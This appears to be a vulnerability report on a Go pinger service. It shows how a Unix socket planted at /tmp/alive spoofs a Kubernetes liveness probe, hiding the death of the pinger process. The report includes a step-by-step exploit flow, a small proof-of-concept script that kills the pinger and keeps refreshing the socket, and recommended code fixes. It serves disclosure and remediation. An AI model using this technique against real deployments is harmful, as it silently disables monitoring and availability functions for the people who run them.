### Title
Liveness Probe Bypass via Socket File at `/tmp/alive` Due to Missing File-Type Validation and Silent Heartbeat Write Failure

### Summary
`pinger/cmd/healthcheck/main.go` uses `os.Stat("/tmp/alive")` to confirm liveness, but `os.Stat` succeeds on any inode type including Unix domain sockets. Simultaneously, `pinger/main.go` silently discards errors from `os.WriteFile("/tmp/alive", ...)`, so if `/tmp/alive` is a socket file, the heartbeat write fails with `ENXIO` and the mtime is never updated by the pinger. An attacker with `/tmp` write access can plant a socket file with a fresh mtime, causing the liveness probe to return healthy even when the pinger process is dead, preventing Kubernetes from restarting the pod.

### Finding Description
**Code path 1 — healthcheck (probe side):**
`pinger/cmd/healthcheck/main.go:27-38`
```go
fi, err := os.Stat("/tmp/alive")   // line 27 — succeeds on socket files
if err != nil { ... os.Exit(1) }
age := time.Since(fi.ModTime())    // line 34 — reads st_mtime of the socket
if age > 2*time.Minute { ... os.Exit(1) }
os.Exit(0)                         // exits healthy if socket mtime is fresh
```
`os.Stat` wraps the `stat(2)` syscall, which returns successfully for any file type (regular file, socket, pipe, directory). There is no `fi.Mode().IsRegular()` or equivalent check. The only validation is the 2-minute mtime window.

**Code path 2 — pinger heartbeat (writer side):**
`pinger/main.go:36`
```go
_ = os.WriteFile("/tmp/alive", []byte(time.Now().Format(time.RFC3339Nano)), 0644)
```
`os.WriteFile` internally calls `open(path, O_WRONLY|O_CREATE|O_TRUNC)`. On Linux, calling `open()` on a Unix domain socket inode returns `ENXIO` — the kernel refuses to open a socket as a regular file. The error is silently discarded (`_ =`). The socket file is never overwritten; its mtime is never updated by the pinger.

**Root cause:** Two independent failed assumptions:
1. The healthcheck assumes only a regular file can exist at `/tmp/alive`.
2. The heartbeat goroutine assumes `os.WriteFile` always succeeds or that failure is harmless.

**Exploit flow:**
1. Attacker gains `/tmp` write access (see Likelihood).
2. Attacker creates a Unix domain socket at `/tmp/alive`: `syscall.Bind(fd, &syscall.SockaddrUnix{Name: "/tmp/alive"})` — mtime is set to now.
3. Kubernetes exec-probe runs `/healthcheck live` every 10 seconds.
4. `os.Stat("/tmp/alive")` → success (socket exists).
5. `fi.ModTime()` → socket creation time, age < 2 minutes → `os.Exit(0)` → probe reports healthy.
6. Pinger's heartbeat goroutine fires every 15 seconds: `os.WriteFile("/tmp/alive", ...)` → `ENXIO` → silently dropped. Socket mtime unchanged.
7. Attacker refreshes the socket (delete + recreate, or `utimes` syscall) every <2 minutes to keep mtime fresh.
8. Kubernetes never triggers a pod restart regardless of pinger's actual state.

**Why existing checks are insufficient:**
- `readOnlyRootFilesystem: true` applies to the container's root overlay filesystem. `/tmp` is a separate writable `tmpfs` mount; this flag does not protect it.
- `runAsNonRoot: true` / `runAsUser: 1000` only prevents privilege escalation; it does not prevent a co-located process running as the same UID from writing to shared `/tmp`.
- `capabilities: drop: [ALL]` — creating a Unix domain socket requires no capabilities.
- The `scratch` base image eliminates shells but does not prevent a sidecar container or a pre-planted binary from performing the attack.

### Impact Explanation
The pinger's purpose is to submit periodic Hedera network transactions as a liveness signal for the mirror node infrastructure. If the pinger process dies but the liveness probe is permanently spoofed, Kubernetes never restarts the pod. The result is silent, indefinite cessation of transaction submission with no alerting from the orchestration layer. This is a griefing/availability impact: no economic loss per transaction, but the monitoring/pinging function of the component is completely neutralized for as long as the attacker maintains the socket file.

### Likelihood Explanation
**Precondition:** Write access to `/tmp` inside the pod. Realistic vectors:
- A sidecar container (e.g., a log shipper, service mesh proxy, or init container) sharing an `emptyDir` volume mounted at `/tmp`. This is a common Kubernetes pattern.
- Any code-execution vulnerability in the pinger binary itself (e.g., via malicious config, dependency confusion) running as UID 1000 — same UID already owns `/tmp`.
- A compromised supply-chain artifact injected into the same pod.

The attack requires no elevated privileges, no kernel exploits, and no capabilities. The socket creation is a single syscall. Maintaining the attack (refreshing mtime every <2 minutes) is trivially automated. The attack is fully repeatable and leaves no obvious log trace since `os.WriteFile` errors are silently dropped.

### Recommendation
1. **Validate file type in healthcheck:** After `os.Stat`, assert the path is a regular file:
   ```go
   if !fi.Mode().IsRegular() {
       fmt.Fprintln(os.Stderr, "heartbeat path is not a regular file")
       os.Exit(1)
   }
   ```
2. **Do not silently discard heartbeat write errors** in `pinger/main.go:36`. Log or handle the error so that a failed write is observable:
   ```go
   if err := os.WriteFile("/tmp/alive", []byte(...), 0644); err != nil {
       log.Printf("heartbeat write failed: %v", err)
   }
   ```
3. **Atomically replace the file:** Write to a temp file and `os.Rename` into place. `rename(2)` will replace a socket inode with a regular file atomically, eliminating the race entirely.
4. **Consider a dedicated tmpfs with restricted permissions** (mode 0700, owned by UID 1000 only) if sidecars share the pod.

### Proof of Concept
```bash
# Inside the pod (or from a sidecar sharing /tmp), as UID 1000:

# Step 1: Remove any existing /tmp/alive
rm -f /tmp/alive

# Step 2: Create a Unix domain socket at /tmp/alive
python3 -c "
import socket, os, time
while True:
    try: os.unlink('/tmp/alive')
    except: pass
    s = socket.socket(socket.AF_UNIX)
    s.bind('/tmp/alive')
    time.sleep(90)   # refresh before 2-minute window expires
"

# Step 3: Kill the pinger process
kill $(pgrep pinger)

# Step 4: Observe that /healthcheck live still exits 0
/healthcheck live; echo "exit: $?"
# Output: exit: 0   <-- probe reports healthy despite dead pinger

# Step 5: Confirm pinger's WriteFile fails silently
# (no log output, no error — the socket mtime is never updated by pinger)
stat /tmp/alive   # type: socket, mtime controlled by attacker
```
